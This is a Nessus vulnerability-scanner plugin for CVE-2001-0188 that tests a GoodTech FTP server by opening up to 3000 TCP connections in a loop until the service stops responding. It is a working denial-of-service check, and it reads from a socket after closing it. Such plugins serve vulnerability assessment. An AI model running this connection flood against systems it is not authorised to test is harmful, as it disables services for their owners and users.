#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10690);
 script_bugtraq_id(2270);
 script_cve_id("CVE-2001-0188");
 
 script_version ("$Revision: 1.14 $");
 
 name["english"] = "GoodTech ftpd DoS";

 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis : 

The remote ftp server is prone to denial of service attacks.

Description :

The remote host appears to be running GoodTech FTP Server for Windows. 

It was possible to disable the remote FTP server by connecting to it
about 3000 separate times.  If the remote server is running from
within [x]inetd, this is a feature and the FTP server should
automatically be back in a couple of minutes.  An attacker may use
this flaw to prevent this service from working properly. 

See also :

http://archives.neohapsis.com/archives/bugtraq/2001-01/0350.html

Solution : 

Upgrade to a version of GoodTech FTP server later than 3.0.1.2.1.0. 

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:NR/C:N/A:P/I:N/B:A)";

 script_description(english:desc["english"]);
 
 summary["english"] = "connections attempts overflow";

 
 script_summary(english:summary["english"]);

  if (ACT_FLOOD) script_category(ACT_FLOOD);
  else		 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2001 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(get_port_state(port))
{
  soc = open_sock_tcp(port);
  if(!soc)exit(0);
  close(soc);

  r = recv_line(socket:soc, length:4096);
  if ( "GoodTech" >!< r ) exit(0);
  
  for(i=0;i<3000;i=i+1)
  {
   soc = open_sock_tcp(port);
   if(!soc)
   {
    i = 3001;
    security_warning(port);
    exit(0);
   }
   close(soc);
  }
}
